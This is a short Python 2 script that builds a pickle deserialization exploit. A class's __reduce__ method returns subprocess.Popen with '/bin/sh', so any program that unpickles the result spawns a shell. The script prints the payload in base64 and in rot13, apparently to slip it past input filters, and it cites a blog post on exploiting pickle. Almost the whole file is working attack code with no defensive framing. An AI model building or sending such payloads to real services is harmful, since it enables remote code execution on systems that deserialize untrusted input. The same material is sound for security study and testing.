import pickle
import cPickle
import subprocess
import base64
import codecs

#https://blog.nelhage.com/2011/03/exploiting-pickle/
class RunBinSh(object):
  def __reduce__(self):
    return (subprocess.Popen, (('/bin/sh',),))

# print base64.b64encode(cPickle.dumps(RunBinSh()))
obj = base64.b64encode(cPickle.dumps(RunBinSh()))

print("payload: %s"%'/bin/sh')
print("payload pickled: %s"%obj)
print("payload rot-13 : %s"%obj.encode('rot13'))


